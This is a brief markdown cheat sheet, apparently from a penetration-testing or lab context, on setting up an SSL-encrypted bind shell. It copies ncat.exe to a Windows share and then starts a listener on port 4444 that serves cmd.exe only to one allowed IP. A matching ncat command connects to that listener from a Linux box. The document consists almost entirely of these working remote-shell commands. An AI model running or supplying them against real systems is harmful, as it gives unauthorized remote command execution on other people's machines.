# Creating a more secure bind shell

## On the windows box
1. Move ncat.exe to the windows share

2. Run the following command

```ncat -lvp 4444 -e cmd.exe --allow YOU.RE.IP.ADD --ssl```

## On the linux box

1. run the following to connect to the cmd.exe

```ncat -v IP.AD.DRE.SS --ssl```
